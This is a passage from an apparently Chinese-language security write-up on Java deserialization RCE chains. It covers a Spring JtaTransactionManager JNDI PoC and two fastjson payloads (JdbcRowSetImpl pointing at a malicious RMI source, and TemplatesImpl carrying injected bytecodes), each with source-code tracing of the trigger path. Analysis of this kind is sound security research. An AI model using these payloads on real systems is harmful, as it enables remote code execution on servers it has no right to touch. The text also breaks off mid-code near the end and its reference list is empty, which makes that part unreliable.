        });
    }
而`execute()`方法的定义如下
    public  T execute(JndiCallback contextCallback) throws NamingException {
            Context ctx = this.getContext();
            Object var3;
            try {
                var3 = contextCallback.doInContext(ctx);//此处触发RCE
            } finally {
                this.releaseContext(ctx);
            }
            return var3;
        }
可以看到在整个流程的最后将会查询最开始我们由反序列化传入的`org.springframework.transaction.jta.JtaTransactionManager`类的对象的`userTransactionName`属性，最终导致加载了我们恶意的rmi源中的恶意类，从而导致RCE。
###  Poc
这个漏洞的Poc构造比起之前分析的apache common collections反序列化的Poc构造显然要简单许多：
    System.out.println("Connecting to server "+serverAddress+":"+port);
    Socket socket=new Socket(serverAddress,port);
    System.out.println("Connected to server");
    String jndiAddress = "rmi://127.0.0.1:1099/Object";//恶意的rmi注册源
    org.springframework.transaction.jta.JtaTransactionManager object = new org.springframework.transaction.jta.JtaTransactionManager();
    object.setUserTransactionName(jndiAddress);
    System.out.println("Sending object to server...");
    ObjectOutputStream objectOutputStream = new ObjectOutputStream(socket.getOutputStream());
    objectOutputStream.writeObject(object);
    objectOutputStream.flush();
可以看到已经弹出了计算器
## fastjson反序列化漏洞
与上面的利用链不同，之前我们介绍到的利用链都是由`readObject()`方法触发，而在fastjson的反序列化中我们触发漏洞则是利用了目标类的`setXXX()`方法和`getXXX()`方法，因为这两个方法是fastjson在完成反序列化时需要调用的方法。
关于fastjson的反序列化我测试了两种不同的利用链，分别为`JdbcRowSetImpl`与`TemplatesImpl`.前者正如同之前测试的spring
jndi反序列化漏洞，使用了JNDI这一java特性来实现RCE；而后者则使用了另一套不同的机制。这里给出两种利用链的分析。
## JdbcRowSetImpl
利用JdbcRowSetImpl时使用的payload主要如下:
    {
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://127.0.0.1:3456/Object",
        "autoCommit":true
    }
在触发反序列化时会调用`JdbcRowSetImpl`类的 `setAutoCommit`函数
    public void setAutoCommit(boolean var1) throws SQLException {
            if (this.conn != null) {
                this.conn.setAutoCommit(var1);
            } else {
                this.conn = this.connect();
                this.conn.setAutoCommit(var1);
            }
    }
继续跟进`connect`函数
    protected Connection connect() throws SQLException {
            if (this.conn != null) {
                return this.conn;
            } else if (this.getDataSourceName() != null) {
                try {
                    InitialContext var1 = new InitialContext();
                    DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());
                    return this.getUsername() != null && !this.getUsername().equals("") ? var2.getConnection(this.getUsername(), this.getPassword()) : var2.getConnection();
                } catch (NamingException var3) {
                    throw new SQLException(this.resBundle.handleGetObject("jdbcrowsetimpl.connect").toString());
                }
            } else {
                return this.getUrl() != null ? DriverManager.getConnection(this.getUrl(), this.getUsername(), this.getPassword()) : null;
            }
    }
可以看到当conn为null时会发起JNDI查询从而加载我们的恶意类,这条利用链也是很简单的一条利用链，其缺陷也很明显，在jdk版本1.8时无法直接使用。
## TemplatesImpl
payload如下:
    {    "@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
        "_bytecodes":["base64编码后的继承于AbstractTranslet类的子类的class文件"],
        '_name':'a.b',
        '_tfactory':{ },
        "_outputProperties":{ },
        "_version":"1.0",
        "allowedProtocols":"all"
    }
由于`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`类的`outputProperties`属性类型为`Properties`因此在反序列化过程中会调用该类的`getOutputProperties`方法。
    public synchronized Properties getOutputProperties() {
        try {
            return newTransformer().getOutputProperties();
        }
        catch (TransformerConfigurationException e) {
            return null;
        }
    }
继续跟进`newTransformer`方法
    public synchronized Transformer newTransformer()
            throws TransformerConfigurationException
        {
            TransformerImpl transformer;
            transformer = new TransformerImpl(getTransletInstance(), _outputProperties,
                _indentNumber, _tfactory);//this line
            if (_uriResolver != null) {
                transformer.setURIResolver(_uriResolver);
            }
            if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) {
                transformer.setSecureProcessing(true);
            }
            return transformer;
        }
在`newTransformer`方法中需要实例化一个TransformerImpl类的对象，跟进`getTransletInstance()`方法
    private Translet getTransletInstance()
            throws TransformerConfigurationException {
            try {
                if (_name == null) return null;
                if (_class == null) defineTransletClasses();
                // The translet needs to keep a reference to all its auxiliary
                // class to prevent the GC from collecting them
                AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();
                translet.postInitialization();
                translet.setTemplates(this);
                translet.setServicesMechnism(_useServicesMechanism);
                translet.setAllowedProtocols(_accessExternalStylesheet);
                if (_auxClasses != null) {
                    translet.setAuxiliaryClasses(_auxClasses);
                }
                return translet;
            }
            catch (InstantiationException e) {
                ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
                throw new TransformerConfigurationException(err.toString());
            }
            catch (IllegalAccessException e) {
                ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
                throw new TransformerConfigurationException(err.toString());
            }
        }
跟进`defineTransletClasses`方法中
    private void defineTransletClasses()
            throws TransformerConfigurationException {
            if (_bytecodes == null) {
                //...
            }
            TransletClassLoader loader = (TransletClassLoader)
                AccessController.doPrivileged(new PrivilegedAction() {
                    public Object run() {
                        return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());
                    }
                });
            try {
                final int classCount = _bytecodes.length;
                _class = new Class[classCount];
                if (classCount > 1) {
                    _auxClasses = new Hashtable();
                }
                for (int i = 0; i ) 得知存在绕过限制的方法，大家也可以去测试一下。
## 参考文章
  * 
  * 
  * 
  * 
  * 
  * 